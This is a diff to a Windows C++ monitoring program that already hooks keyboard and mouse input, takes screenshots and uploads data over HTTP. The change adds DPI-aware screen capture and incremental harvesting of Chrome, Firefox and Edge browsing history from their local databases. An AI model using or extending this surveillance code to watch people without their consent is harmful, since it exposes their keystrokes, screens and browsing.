@@ -30,6 +30,7 @@ typedef ULONG PROPID;
 #include <algorithm> // for std::replace
 #include <iomanip>   // for std::put_time
 #include <iphlpapi.h> // for GetAdaptersInfo
+#include <ShellScalingApi.h>
 
 // USB device notification constants (if not defined in MinGW)
 #ifndef DBT_DEVICEARRIVAL
@@ -90,6 +91,7 @@ typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "setupapi.lib")
 #pragma comment(lib, "sqlite3.lib")
+#pragma comment(lib, "Shcore.lib")
 
 #define SCREEN_INTERVAL 5
 #define TIC_INTERVAL 30
@@ -108,6 +110,11 @@ std::vector<Json::Value> browserHistories;
 std::mutex dataMutex;
 HHOOK keyboardHook = NULL;
 HHOOK mouseHook = NULL;
+
+// Browser history tracking - store last fetch times for each browser
+int64_t lastChromeFetch = 0;
+int64_t lastFirefoxFetch = 0;
+int64_t lastEdgeFetch = 0;
 
 // Log file for debugging
 std::ofstream debugLogFile;
@@ -164,9 +171,9 @@ void setupUSBMONITORING();
 void cleanupUSBMONITORING();
 std::string httpPost(const std::string& url, const std::string& data);
 std::string httpPostFile(const std::string& url, const std::string& filePath);
-std::string getChromeHistory();
-std::string getFirefoxHistory();
-std::string getEdgeHistory();
+std::string getChromeHistory(int64_t sinceTime = 0);
+std::string getFirefoxHistory(int64_t sinceTime = 0);
+std::string getEdgeHistory(int64_t sinceTime = 0);
 void monitorTask();
 void writeDebugLog(const std::string& message);
 
@@ -397,24 +404,27 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 
 // Take screenshot
 void takeScreenshot(const std::string& filePath) {
-    HDC hdcScreen = GetDC(NULL);
+    // Get the desktop window handle
+    HWND hDesktop = GetDesktopWindow();
+    
+    // Get the desktop DC
+    HDC hdcScreen = GetDC(hDesktop);
     HDC hdcMemory = CreateCompatibleDC(hdcScreen);
     
-    // Get actual screen dimensions (handles multi-monitor and DPI scaling)
-    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
-    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+    // Get the desktop dimensions (now DPI-aware)
+    RECT desktopRect;
+    GetWindowRect(hDesktop, &desktopRect);
     
-    // For high DPI displays, get the actual pixel dimensions
-    int virtualWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-    int virtualHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    int captureWidth = desktopRect.right - desktopRect.left;
+    int captureHeight = desktopRect.bottom - desktopRect.top;
     
-    // Use the larger of the two to ensure we capture everything
-    int captureWidth = (virtualWidth > screenWidth) ? virtualWidth : screenWidth;
-    int captureHeight = (virtualHeight > screenHeight) ? virtualHeight : screenHeight;
+    writeDebugLog("Desktop dimensions: " + std::to_string(captureWidth) + "x" + std::to_string(captureHeight));
     
+    // Create a bitmap at the correct resolution
     HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
     HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMemory, hbmScreen);
     
+    // Capture the entire desktop
     BitBlt(hdcMemory, 0, 0, captureWidth, captureHeight, hdcScreen, 0, 0, SRCCOPY);
     
     // Save to file using GDI+ with optimized compression
@@ -802,11 +812,12 @@ void removeKeyboardHook() {
 // Collect browser history
 void collectBrowserHistory() {
     // Chrome history
-    std::string chromeHistory = getChromeHistory();
+    std::string chromeHistory = getChromeHistory(lastChromeFetch);
     if (!chromeHistory.empty()) {
         Json::Value historyArray;
         Json::Reader reader;
         if (reader.parse(chromeHistory, historyArray)) {
+            int64_t maxTime = lastChromeFetch;
             for (const auto& entry : historyArray) {
                 Json::Value history;
                 history["browser"] = "Chrome";
@@ -815,18 +826,30 @@ void collectBrowserHistory() {
                 history["last_visit"] = entry["last_visit"];
                 history["date"] = getCurrentDateTimeString();
                 
+                // Track the latest time we've seen
+                int64_t visitTime = entry["last_visit"].asInt64();
+                if (visitTime > maxTime) {
+                    maxTime = visitTime;
+                }
+                
                 std::lock_guard<std::mutex> lock(dataMutex);
                 browserHistories.push_back(history);
+            }
+            // Update the last fetch time
+            if (maxTime > lastChromeFetch) {
+                lastChromeFetch = maxTime;
+                writeDebugLog("Updated Chrome last fetch time to: " + std::to_string(lastChromeFetch));
             }
         }
     }
     
     // Firefox history
-    std::string firefoxHistory = getFirefoxHistory();
+    std::string firefoxHistory = getFirefoxHistory(lastFirefoxFetch);
     if (!firefoxHistory.empty()) {
         Json::Value historyArray;
         Json::Reader reader;
         if (reader.parse(firefoxHistory, historyArray)) {
+            int64_t maxTime = lastFirefoxFetch;
             for (const auto& entry : historyArray) {
                 Json::Value history;
                 history["browser"] = "Firefox";
@@ -835,18 +858,30 @@ void collectBrowserHistory() {
                 history["last_visit"] = entry["last_visit"];
                 history["date"] = getCurrentDateTimeString();
                 
+                // Track the latest time we've seen
+                int64_t visitTime = entry["last_visit"].asInt64();
+                if (visitTime > maxTime) {
+                    maxTime = visitTime;
+                }
+                
                 std::lock_guard<std::mutex> lock(dataMutex);
                 browserHistories.push_back(history);
+            }
+            // Update the last fetch time
+            if (maxTime > lastFirefoxFetch) {
+                lastFirefoxFetch = maxTime;
+                writeDebugLog("Updated Firefox last fetch time to: " + std::to_string(lastFirefoxFetch));
             }
         }
     }
     
     // Edge history
-    std::string edgeHistory = getEdgeHistory();
+    std::string edgeHistory = getEdgeHistory(lastEdgeFetch);
     if (!edgeHistory.empty()) {
         Json::Value historyArray;
         Json::Reader reader;
         if (reader.parse(edgeHistory, historyArray)) {
+            int64_t maxTime = lastEdgeFetch;
             for (const auto& entry : historyArray) {
                 Json::Value history;
                 history["browser"] = "Edge";
@@ -855,15 +890,26 @@ void collectBrowserHistory() {
                 history["last_visit"] = entry["last_visit"];
                 history["date"] = getCurrentDateTimeString();
                 
+                // Track the latest time we've seen
+                int64_t visitTime = entry["last_visit"].asInt64();
+                if (visitTime > maxTime) {
+                    maxTime = visitTime;
+                }
+                
                 std::lock_guard<std::mutex> lock(dataMutex);
                 browserHistories.push_back(history);
+            }
+            // Update the last fetch time
+            if (maxTime > lastEdgeFetch) {
+                lastEdgeFetch = maxTime;
+                writeDebugLog("Updated Edge last fetch time to: " + std::to_string(lastEdgeFetch));
             }
         }
     }
 }
 
 // Get Chrome history
-std::string getChromeHistory() {
+std::string getChromeHistory(int64_t sinceTime) {
 #ifdef _MSC_VER
     char* localAppData;
     size_t len;
@@ -889,7 +935,14 @@ std::string getChromeHistory() {
         return "";
     }
     
-    std::string query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
+    std::string query;
+    if (sinceTime > 0) {
+        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
+        writeDebugLog("Chrome query with sinceTime: " + std::to_string(sinceTime));
+    } else {
+        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
+        writeDebugLog("Chrome query without sinceTime (first run)");
+    }
     sqlite3_stmt* stmt;
     
     Json::Value historyArray(Json::arrayValue);
@@ -922,7 +975,7 @@ std::string getChromeHistory() {
 }
 
 // Get Firefox history
-std::string getFirefoxHistory() {
+std::string getFirefoxHistory(int64_t sinceTime) {
 #ifdef _MSC_VER
     char* appData;
     size_t len;
@@ -978,7 +1031,14 @@ std::string getFirefoxHistory() {
         return "";
     }
     
-    std::string query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100";
+    std::string query;
+    if (sinceTime > 0) {
+        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL AND last_visit_date > " + std::to_string(sinceTime) + " ORDER BY last_visit_date DESC LIMIT 100";
+        writeDebugLog("Firefox query with sinceTime: " + std::to_string(sinceTime));
+    } else {
+        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100";
+        writeDebugLog("Firefox query without sinceTime (first run)");
+    }
     sqlite3_stmt* stmt;
     
     Json::Value historyArray(Json::arrayValue);
@@ -1011,7 +1071,7 @@ std::string getFirefoxHistory() {
 }
 
 // Get Edge history
-std::string getEdgeHistory() {
+std::string getEdgeHistory(int64_t sinceTime) {
 #ifdef _MSC_VER
     char* localAppData;
     size_t len;
@@ -1037,7 +1097,14 @@ std::string getEdgeHistory() {
         return "";
     }
     
-    std::string query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
+    std::string query;
+    if (sinceTime > 0) {
+        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
+        writeDebugLog("Edge query with sinceTime: " + std::to_string(sinceTime));
+    } else {
+        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
+        writeDebugLog("Edge query without sinceTime (first run)");
+    }
     sqlite3_stmt* stmt;
     
     Json::Value historyArray(Json::arrayValue);
@@ -1130,6 +1197,9 @@ void monitorTask() {
 
 // Main function
 int main() {
+    // Set DPI awareness to handle scaling properly (MinGW compatible)
+    SetProcessDPIAware();
+    
     // Initialize COM for GDI+
     CoInitialize(NULL);
     
